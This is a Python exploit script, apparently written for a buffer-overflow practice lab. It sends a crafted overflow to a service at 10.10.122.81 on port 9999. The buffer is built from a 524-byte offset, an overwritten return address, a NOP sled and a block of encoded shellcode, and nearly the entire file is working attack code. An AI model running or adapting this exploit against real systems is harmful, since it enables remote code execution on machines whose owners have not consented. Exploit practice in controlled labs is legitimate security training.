import socket
import os

ip = "10.10.122.81"
port = 9999

# bad chars = \x0a

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = (
  "\xda\xde\xbb\x88\x51\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
  "\x59\x83\xc2\x04\x31\x5a\x15\x03\x5a\x15\x6a\xa4\x5f\x46\xe5"
  "\x47\xa0\x97\x99\xce\x45\xa6\x8b\xb5\x0e\x9b\x1b\xbd\x43\x10"
  "\xd0\x93\x77\x27\x51\x59\x5e\x06\x62\xd5\xec\x40\xad\x2a\xbc"
  "\xad\xac\xd6\xbf\xe1\x0e\xe6\x0f\xf4\x4f\x2f\xc6\x72\xa0\xfd"
  "\x52\x2e\x2e\x55\xee\x8d\x72\x58\x20\x9a\xca\x22\x45\x5d\xbe"
  "\x9e\x44\x8e\xb5\x57\x5f\xa5\x91\x47\x5e\x6a\x71\x0d\xa9\xf8"
  "\x4d\x44\xa1\x35\x26\x57\x63\x04\xc7\x69\x4b\xcb\xf6\x45\x46"
  "\x15\x3f\x61\xb9\x60\x4b\x91\x44\x73\x88\xeb\x92\xf6\x0e\x4b"
  "\x50\xa0\xea\x6d\xb5\x37\x79\x61\x72\x33\x25\x66\x85\x90\x5e"
  "\x92\x0e\x17\xb0\x12\x54\x3c\x14\x7e\x0e\x5d\x0d\xda\xe1\x62"
  "\x4d\x82\x5e\xc7\x06\x21\x88\x77\xe7\xb9\xb5\x25\x7f\x75\x78"
  "\xd6\x7f\x11\x0b\xa5\x4d\xbe\xa7\x21\xfd\x37\x6e\xb5\x74\x5f"
  "\x91\x69\x3e\x30\x6f\x8a\x3e\x18\xb4\xde\x6e\x32\x1d\x5f\xe5"
  "\xc2\xa2\x8a\x93\xc8\x34\x3f\x6e\xc2\xf3\x57\x72\xdc\xea\xfb"
  "\xfb\x3a\x5c\x54\xab\x92\x1d\x04\x0b\x43\xf6\x4e\x84\xbc\xe6"
  "\x70\x4f\xd5\x8d\x9e\x39\x8d\x39\x06\x60\x45\xdb\xc7\xbf\x23"
  "\xdb\x4c\x35\xd3\x92\xa4\x3c\xc7\xc3\xd2\xbe\x17\x14\x77\xbe"
  "\x7d\x10\xd1\xe9\xe9\x1a\x04\xdd\xb5\xe5\x63\x5e\xb1\x1a\xf2"
  "\x56\xc9\x2d\x60\xd6\xa5\x51\x64\xd6\x35\x04\xee\xd6\x5d\xf0"
  "\x4a\x85\x78\xff\x46\xba\xd0\x6a\x69\xea\x85\x3d\x01\x10\xf3"
  "\x0a\x8e\xeb\xd6\x08\xc9\x13\xa4\x26\x72\x7b\x56\x77\x82\x7b"
  "\x3c\x77\xd2\x13\xcb\x58\xdd\xd3\x34\x73\xb6\x7b\xbe\x12\x74"
  "\x1a\xbf\x3e\xd8\x82\xc0\xcd\xc1\x35\xba\xbe\xf6\xb6\x3b\xd7"
  "\x92\xb7\x3b\xd7\xa4\x84\xed\xee\xd2\xcb\x2d\x55\xec\x7e\x13"
  "\xfc\x67\x80\x07\xfe\xad"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.send(bytes(buffer + "\n", "latin-1"))
  #s.recv(1024)
  s.close()
except:
  print("Could not connect.")
